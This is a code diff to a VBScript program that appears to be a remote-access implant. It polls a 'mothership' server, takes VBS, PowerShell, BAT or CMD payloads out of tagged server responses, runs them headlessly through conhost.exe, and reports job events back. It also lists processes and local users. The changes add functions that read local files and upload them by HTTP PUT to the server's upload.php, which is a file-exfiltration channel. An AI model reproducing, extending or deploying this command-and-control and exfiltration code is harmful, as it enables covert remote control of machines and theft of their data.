@@ -1,4 +1,4 @@
-' 2026.06.21-1741
+' 2026.06.24-0923
 
 Option Explicit
 On Error Resume Next
@@ -157,7 +157,6 @@ Function GetProcessName(pid)
     
 End Function
 
-' TODO
 Function GetProcessList()
     Call LogMsg("GetProcessList")
     
@@ -241,8 +240,25 @@ Function HeadersToDict(responsetext)
 
 End Function
 
-Function UploadResult(remotepath, localfpath)
-    '
+Function UploadResult(fname, localfpath)
+    Err.Clear
+    
+    Dim pp : pp = "UploadResult"
+    
+    Call LogMsg(pp & " -- starting")
+    
+    Dim url : url =  mothership & "/ow/upload.php?filename=" & URLEncode(fname) & "&" & GetScriptTagStrUrlDirect()
+    
+    Call UploadFile(url, localfpath)
+    
+    If Err.Number <> 0 then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End IF
+    
+    Call LogMsg(pp & " -- finished")
+    
 End Function
 
 Function RetrieveAsset(fname, localfpath)
@@ -290,6 +306,119 @@ Function IsDict(objin)
             End If
         End If
     End If
+    
+End Function
+
+Function UploadFile(url, localfpath)
+    Dim pp : pp = "UploadFile"
+
+    If XIsEmpty(url) then
+        Exit Function
+    End If
+    
+    If XIsEmpty(localfpath) then
+        Exit Function
+    End IF
+    
+    If not fso.FileExists(localfpath) then
+        Exit Function
+    End IF
+    
+    Dim fileBytes : fileBytes = ReadBinaryFile(localfpath)
+    Dim totalBytes
+
+    If IsNull(fileBytes) Then
+        Call LogMsg(pp & " -- file byte array is null -- exiting function")
+        Exit Function
+    Else 
+        totalBytes = UBound(fileBytes) + 1
+
+        If totalBytes <= 0 then
+            Call LogMsg(pp & " -- file byte array is empty -- exiting function")
+            Exit Function
+        else
+            Call LogMsg(pp & " -- file byte array size " & CStr(totalBytes))
+        End If
+    
+    End If
+
+    Dim http : Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+
+    http.Open "PUT", url, False
+    http.setRequestHeader "Content-Type", "application/octet-stream"
+    http.Send fileBytes
+
+   
+    Dim headers : headers = http.GetAllResponseHeaders()
+    Dim bodyBytes : bodyBytes = http.ResponseBody
+
+    Dim adoStream : Set adoStream = CreateObject("ADODB.Stream")
+    adoStream.Type = 2 'adTypeString
+    adoStream.Charset = "utf-8"
+    adoStream.Open
+    adoStream.Write bodyBytes
+    adoStream.Position = 0
+    Dim responseString : responseString = adoStream.ReadText
+    adoStream.Close
+
+    Call LogMsg("http status: " & http.Status) 
+    Call LogMsg("headers: " & headers)
+    Call LogMsg("response body: " & responseString)
+
+    If Err.Number <> 0 then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End IF
+    
+    Call LogMsg(pp & " -- finished")
+    
+End function
+
+Function ReadBinaryFile(filePath)
+    Err.Clear
+    
+    Dim pp : pp = "ReadBinaryFile"
+    
+    Call LogMsg(pp & " -- starting")
+    
+    If XIsEmpty(filePath) then
+        Call LogMsg(pp & " -- input file path is empty")
+        Exit Function
+    End IF
+    
+    If Not fso.FileExists(filePath) then
+        Call LogMsg(pp & " -- input file does not exist")
+        Exit Function
+    End if
+    
+    Dim stream : Set stream = CreateObject("ADODB.Stream")
+    
+    stream.Type = 1 ' adTypeBinary
+    stream.Open
+    stream.LoadFromFile filePath
+    
+    ReadBinaryFile = stream.Read ' Variant holding a Byte() array 
+    stream.Close
+    
+    If IsNull(ReadBinaryFile) Then
+        Call LogMsg(pp & " -- file byte array is null")
+    Else 
+        Dim totalBytes : totalBytes = UBound(ReadBinaryFile) + 1
+
+        If totalBytes <= 0 then
+            Call LogMsg(pp & " -- file byte array is empty")
+        End If
+    
+    End If
+    
+    If Err.Number <> 0 then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End IF
+    
+    Call LogMsg(pp & " -- finished")
     
 End Function
 
@@ -612,15 +741,15 @@ Function ExecShellAsync(cmdstr)
     Call LogMsg(pp & ": finished")
 End Function
 
-' executes async
-Function ExecShell(cmdstr)
+Function ExecShell(cmdstr) ' executes async
     Dim pp : pp = "ExecShell"
     
     Err.Clear
     
+    Call LogMsg(pp & " -- starting" )
+    
     ExecShell = -1
     
-    ' anchor
     Dim objExec : Set objExec = WshShell.Exec(cmdstr)
 
     ExecShell = objExec.ProcessID
@@ -630,6 +759,8 @@ Function ExecShell(cmdstr)
         Call LogErr()
     End If
 
+    Call LogMsg( pp & " -- finished" )
+    
 End Function
 
 Function RunShell(cmdstr, sync)
@@ -846,7 +977,7 @@ Function GetLocalUsers()
     Next
 
 End Function
-
+ 
 Function FileExists(dirpath, fname)
     FileExists = False
     
@@ -1127,7 +1258,6 @@ Dim clientid : clientid = "abcdwxyz"
 Dim source : source = WScript.ScriptName
 Dim scriptpath : scriptpath = WScript.ScriptFullName
 Dim scriptdir : scriptdir = fso.GetParentFolderName(WScript.ScriptFullName)
-' WScript.CurrentDirectory
 
 Dim machinename : machinename = "LOCALHOST"
 Dim username : username = "UNKNOWNUSER"
@@ -2147,17 +2277,21 @@ Function LaunchExecCmd(argstr)
 End Function
 
 Function LaunchExecScript(scripttext,ext)
+    Err.Clear
+    
     Dim pp : pp = "LaunchExecScript"
+    
     LaunchExecScript = -1
     
     If XIsEmpty(scripttext) or XIsEmpty(ext) Then
+        Call LogMsg(pp & " scripttext or ext is empty -- exiting function")
         Exit Function
     End If
     
-    Call LogMsg(pp & " -- " & ext)
+    Call LogMsg(pp & " | ext=" & ext)
         
     If XIsEmpty(jobcode) Then
-        jobcode = GetRandom(8)
+        jobcode = "EMPTY_JOB_CODE"
     End If
     
     Dim fname : fname = "execscript_" & CStr(jobcode) & "." & LCase(ext)
@@ -2197,15 +2331,17 @@ Function LaunchExecScript(scripttext,ext)
     
     Call PushEventMother("start_job")
 
+    WshShell.CurrentDirectory = folderPath
+    
     Dim res : res = RunShell("conhost.exe --headless " & cmdstr & " > " & fpath & ".log" & " 2>&1", false)
    
     If Err.Number <> 0 Then
-        Call LogMsg(pp & " reporting error")
+        Call LogMsg(pp & " -- reporting errors")
         Call LogErr()
         Exit Function
     End If
     
-    Call LogMsg(pp & " finished")
+    Call LogMsg(pp & " -- finished")
     
     If res Then
         Call PushEventMother("job_finished")
@@ -2216,19 +2352,22 @@ Function LaunchExecScript(scripttext,ext)
 End Function
 
 Function ProcessExecCmd(inpingstr)
-	Call LogMsg("ProcessExecCmd")
+    Err.Clear
     
-	If XIsEmpty(inpingstr) Then
-		Exit Function
-	End IF
-	
+    Dim pp : pp = "ProcessExecCmd"
+    
+    Call LogMsg(pp & " -- starting")
+    
+    If XIsEmpty(inpingstr) Then
+        Call LogMsg(pp & " inpingstr is empty -- exiting function")
+        Exit Function
+    End IF
+    
     If InStr(inpingstr, "EXEC_") <=0 Then
-        Call LogMsg("could not find any EXEC_ tag in ping response -- exiting function")
+        Call LogMsg(pp & " could not find any EXEC_ tag in ping response -- exiting function")
         Exit Function
     End If
-    
-	Call LogMsg("ProcessExecCmd")
-    
+        
     jobcode = ExtractText(inpingstr, "JOBCODE_BEGIN", "JOBCODE_END")
     
     If XIsEmpty(jobcode) Then
@@ -2237,7 +2376,7 @@ Function ProcessExecCmd(inpingstr)
     
     Dim tokens : tokens = Array("VBS", "PS1", "BAT", "CMD")
 
-	Dim begin_token 
+    Dim begin_token 
     Dim end_token
     Dim argstr
     Dim token
@@ -2248,24 +2387,32 @@ Function ProcessExecCmd(inpingstr)
         argstr = ExtractText(inpingstr, begin_token, end_token)
         
         if token = "CMD" and not XIsEmpty(argstr) then
-            Call LogMsg("ProcessExecCmd -- detected CMD")
+            Call LogMsg(pp & " detected " & token)
+            
             Call LaunchExecCmd(argstr)
             
-            Call LogMsg("ProcessExecCmd finished")
+            Call LogMsg(pp & " -- finished")
             Exit Function
         end if
         
         if token <> "CMD" and not XIsEmpty(argstr) then
-            Call LogMsg("ProcessExecCmd -- detected " & token)        
+            Call LogMsg(pp & " detected " & token)
+            
             Call LaunchExecScript(argstr, token)
             
-            Call LogMsg("ProcessExecCmd finished")
+            Call LogMsg(pp & " -- finished")
             Exit Function
         end if
         
     Next
 
-    Call LogMsg("ProcessExecCmd error")
+    If Err.Number <> 0 then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End If
+    
+    Call LogMsg(pp & " -- finished")
 
 End Function
 
@@ -2790,7 +2937,7 @@ Function ExecPython(scriptname, scriptdir, scriptfname, args)
     
     If XIsEmpty(scriptname) or XIsEmpty(scriptdir) or XIsEmpty(scriptfname) Then
         Exit Function
-    End IF										 
+    End IF
 
     Dim scriptfpath : scriptfpath = scriptdir & "\" & scriptfname
     
